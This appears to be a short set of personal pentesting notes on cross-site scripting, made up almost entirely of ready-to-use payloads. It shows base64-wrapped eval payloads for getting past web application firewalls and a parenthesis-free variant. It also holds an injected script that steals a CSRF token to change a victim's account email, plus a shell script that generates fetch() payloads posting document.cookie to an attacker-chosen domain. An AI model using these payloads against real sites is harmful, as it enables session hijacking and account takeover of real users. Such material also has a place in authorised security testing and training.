---
icon: js
---

# XSS

eval(atob(b64\_payload)) can help with using base64 to bypass WAFs in JS code context

* Comments can be used to remove `=` padding from b64 if necessary

````javascript
//eval("String" + <USER_INPUT>)
eval(atob('YWxlcnQoMSk='))
// Note above would be nested as:
eval("String" + eval(atob('YWxlcnQoMSk='))

//Avoid Parentheses 
Function`x${'eval\x28atob\x28\x27YWxlcnQoMSk=\x27\x29\x29'}x```
````

Script for generating fetch commands

Request to change email

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

Script for generating fetch commands

```bash
#!/bin/sh

if [ $# -lt 1 ];
then
        echo "$0 target_domain html_tag";

elif [ $# -eq 1 ];
then
        target_domain=$1

cat << EOF
fetch('//$target_domain',
        {
        method: 'POST',
        mode: 'no-cors',
        body: document.cookie
});
EOF

else
        target_domain=$1
        tag=$2

cat << EOF
<$tag>
fetch('//$target_domain',
        {
        method: 'POST',
        mode: 'no-cors',
        body: document.cookie
});
</$tag>
EOF
fi


```
